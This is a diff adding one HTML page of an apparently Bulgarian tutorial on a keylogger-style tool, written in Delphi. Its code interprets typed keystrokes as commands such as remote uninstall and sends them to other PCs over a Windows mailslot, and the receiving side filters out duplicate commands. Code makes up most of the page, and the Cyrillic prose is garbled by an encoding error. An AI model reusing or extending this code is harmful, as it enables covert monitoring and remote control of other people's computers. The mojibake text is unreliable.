+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">else</font> 
+        par:='h1'<br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">end</font>;<br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
+        par='re' <font color="#FFFFFF">then</font> par:='i';<br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
+        par='sh' <font color="#FFFFFF">then</font> par:='j';<br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
+        par='s?' <font color="#FFFFFF">then</font> par:='p';<br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
+        par='s=' <font color="#FFFFFF">then</font><br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">begin</font><br>
+        <font color="#FFFF00">&nbsp;&nbsp;&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
+        par1='0' <font color="#FFFFFF">then</font> par:='q0'<br>
+        <font color="#FFFF00">&nbsp;&nbsp;&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">else</font> 
+        par:='q1'<br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">end</font>;<br>
+        </font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font></font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;&nbsp;&nbsp;</font></font><font face="Courier New, Courier, mono" color="#CCCCCC">{remote 
+        uninstall brat4e}</font><font face="Courier New, Courier, mono"><font color="#FFFF00"><br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
+        par='un' <font color="#FFFFFF">then</font> par:='k';<br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
+        par='w?' <font color="#FFFFFF">then</font> par:='r';<br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
+        par='w=' <font color="#FFFFFF">then</font><br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">begin</font><br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
+        par1='0' <font color="#FFFFFF">then</font> par:='s0'<br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">else</font> 
+        par:='s1'<br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">end</font>;<br>
+        </font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font></font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;&nbsp;&nbsp;</font></font><font face="Courier New, Courier, mono" color="#CCCCCC">{sled 
+        kato sme gotovi izprashtame suobshtenieto. tuka trqbva da se pravi i proverka 
+        na vremete zashtoto se poluchavat po 2-3 edni i sushti komandi na drugoto 
+        PC}</font><font face="Courier New, Courier, mono"><font color="#FFFF00"><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Main.MailSlot1.SendMessage(APar1,Format('%s%s',[TimeToStr(Time),par]));<br>
+        <font color="#FFFF00">&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#FFFFFF">end</font>;<br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">end</font>;</font></font></p>
+      <p><font color="#FFFFFF" face="Courier New, Courier, mono">begin</font><font color="#FFFF00" face="Courier New, Courier, mono"><br>
+        <font color="#CCCCCC">&nbsp;&nbsp;{malko rabota sus Par1Str i Par2Str 
+        kogato imame BkSpace ili Space}</font><br>
+        &nbsp;&nbsp;<font color="#FFFFFF">if</font> (St=' BkSp ') <font color="#FFFFFF">and</font> 
+        (GetPar1) <font color="#FFFFFF">then</font> Delete(Par1Str,Length(Par1Str),1);<br>
+        &nbsp;&nbsp;<font color="#FFFFFF">if</font> (St=' BkSp ') <font color="#FFFFFF">and</font> 
+        (GetPar2) <font color="#FFFFFF">then</font> Delete(Par2Str,Length(Par2Str),1);<br>
+        &nbsp;&nbsp;<font color="#FFFFFF">if</font> (St=' Space ') <font color="#FFFFFF">and</font> 
+        (GetPar1) <font color="#FFFFFF">then</font> Par1Str:=Par1Str+' ';<br>
+        &nbsp;&nbsp;<font color="#FFFFFF">if</font> (St=' Space ') <font color="#FFFFFF">and</font> 
+        (GetPar2) <font color="#FFFFFF">then</font> Par2Str:=Par2Str+' ';<br>
+        &nbsp;&nbsp;<font color="#FFFFFF">if</font> Length(St)&gt;1 <font color="#FFFFFF">then</font> 
+        Exit;<br>
+        &nbsp;&nbsp;<font color="#FFFFFF">if</font> (St=';') <font color="#FFFFFF">and</font> 
+        (GetPar1) <font color="#FFFFFF">then</font><br>
+        <font color="#CCCCCC">&nbsp;&nbsp;{ako imame ; i e vkliuchen GetPar1 znachi 
+        vkliuchvame GetPar2, za da zapochnem da populvame sledvashtiq parametur 
+        - komandata}</font><br>
+        &nbsp;&nbsp;<font color="#FFFFFF">begin</font><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;GetPar1:=false;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;GetPar2:=true;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> DoBeep <font color="#FFFFFF">then</font> 
+        MessageBeep(MB_OK);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;Exit;<br>
+        &nbsp;&nbsp;<font color="#FFFFFF">end</font>;<br>
+        &nbsp;&nbsp;<font color="#FFFFFF">if</font> (St=';') <font color="#FFFFFF">and</font> 
+        (GetPar2) <font color="#FFFFFF">then</font><br>
+        <font color="#CCCCCC">&nbsp;&nbsp;{ako i nego go zapulnim izvikvame SendCmd 
+        i zarejdame LastCmd s novata komanta, za da mojem sled tova da polzvame 
+        ;repeat;}</font><br>
+        &nbsp;&nbsp;<font color="#FFFFFF">begin</font><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;GetPar2:=false;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> Par1Str='' <font color="#FFFFFF">then</font> 
+        Par1Str:=OldPar1<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">else</font> 
+        OldPar1:=Par1Str;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;LastCmd.PCName:=Par1Str;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;LastCmd.Msg:=Par2Str;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;SendCmd(Par1Str,Par2Str);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;Par1Str:='';<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;Par2Str:='';<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;Exit;<br>
+        &nbsp;&nbsp;<font color="#FFFFFF">end</font>;<br>
+        &nbsp;&nbsp;<font color="#FFFFFF">if</font> GetPar1 <font color="#FFFFFF">then</font> 
+        Par1Str:=Par1Str+St;<br>
+        &nbsp;&nbsp;<font color="#FFFFFF">if</font> GetPar2 <font color="#FFFFFF">then</font> 
+        Par2Str:=Par2Str+St;<br>
+        <font color="#FFFFFF">end</font>;</font></p>
+    </td>
+  </tr>
+</table>
+<p><font face="Courier New, Courier, mono"> &nbsp;&nbsp;РўРѕР·Рё mailslot Рµ РЅР°РїСЂР°РІРѕ 
+  С‡СѓРґРµСЃРµРЅ. РњРѕР¶РµС‚Рµ РґРѕСЂРё СЃРµРіР° РґР° СЃРё РЅР°РїСЂР°РІРёС‚Рµ РµРґРЅР° РїСЂРѕРіСЂР°РјРєР° РґР° РёР·РіР°РІСЂРёС‚Рµ РЅСЏРєРѕР№ 
+  РІ Р·Р°Р»Р°С‚Р°.</font></p>
+<p><font face="Courier New, Courier, mono">&nbsp;&nbsp;РўСЉР№ РєР°С‚Рѕ TMain.MailSlot1NewMessage 
+  (РєР°РєРІРѕ СЃРµ РїСЂР°РІРё РїСЂРё РїРѕР»СѓС‡Р°РІР°РЅРµ РЅР° РєРѕРјР°РЅРґР°) СЃРё РёРјР° РєРѕРјРµРЅС‚Р°СЂРё РЅСЏРјР° РґР° СЏ РёР·РєР°СЂРІР°Рј 
+  С‚СѓРє. Р—Р°Р±РµР»РµР¶РµС‚Рµ СЃР°РјРѕ:</font></p>
+<table width="100%" border="1">
+  <tr> 
+    <td bgcolor="#000099"> <font color="#FFFFFF" face="Courier New, Courier, mono">if</font> 
+      <font color="#FFFF00" face="Courier New, Courier, mono">Copy(Text,0,1)&lt;&gt;'l'</font> 
+      <font color="#FFFFFF" face="Courier New, Courier, mono">then</font><font face="Courier New, Courier, mono"><br>
+      <font color="#FFFFFF">begin</font><br>
+      <font color="#FFFFFF">&nbsp;&nbsp;if</font></font> <font color="#FFFF00" face="Courier New, Courier, mono">LastTime=Copy(Text,0,7)</font> 
+      <font color="#FFFFFF" face="Courier New, Courier, mono">then</font> <font color="#FFFF00" face="Courier New, Courier, mono">exit;<br>
+      </font> <font color="#FFFF00" face="Courier New, Courier, mono">&nbsp;&nbsp;LastTime:=Copy(Text,0,7);<br>
+      </font> <font color="#FFFF00" face="Courier New, Courier, mono">&nbsp;&nbsp;Delete(Text,0,7);</font><font face="Courier New, Courier, mono"><br>
+      <font color="#FFFFFF">end</font>;</font></td>
+  </tr>
+</table>
+<p><font face="Courier New, Courier, mono">&nbsp;&nbsp;Р•С‚Рѕ С‚СѓРє РѕС‚ РїРѕР»СѓС‡РµРЅРёСЏ Text 
+  СЃРё РѕС‚СЂСЏР·РІР°РјРµ РІСЂРµРјРµС‚Рѕ РЅР° РёР·РїСЂР°С‰Р°РЅРµ Рё РїСЂРѕРІРµСЂСЏРІР°РјРµ РґР°Р»Рё РІРµС‡Рµ РЅРµ СЃРјРµ РіРѕ РїРѕР»СѓС‡Р°РІР°Р»Рё 
+  РІРµРґРЅСЉР¶. Р©РµС€Рµ РґР° РёРјР° РїСЂРѕР±Р»РµРјРё, Р°РєРѕ РґРІРµ РєРѕРјР°РЅРґРё СЃРµ РёР·РїСЂР°С‚СЏС‚ Р·Р° 1 СЃРµРє, РЅРѕ РЅРµ РјРё 
+  СЃРµ РІСЏСЂРІР° РґР° СѓСЃРїРµРµС‚Рµ РґР° РЅР°РїРёС€РµС‚Рµ ;cmd;pc09;b?; Рё ;cmd;pc09;ex; Р·Р° С‚РѕР»РєРѕРІР° РєСЂР°С‚РєРѕ.</font></p>
+<table width="100%" border="0">
+  <tr> 
+    <td><font face="Courier New, Courier, mono"><a href="log2.htm">РЅР°Р·Р°Рґ</a></font></td>
+    <td> 
+      <div align="center"><font face="Courier New, Courier, mono"><a href="logger.htm#view">РЅР°С‡Р°Р»Рѕ</a></font></div>
+    </td>
+    <td> 
+      <div align="right"><font face="Courier New, Courier, mono">РЅР°РїСЂРµРґ</font></div>
+    </td>
+  </tr>
+</table>
+</body>
+</html>
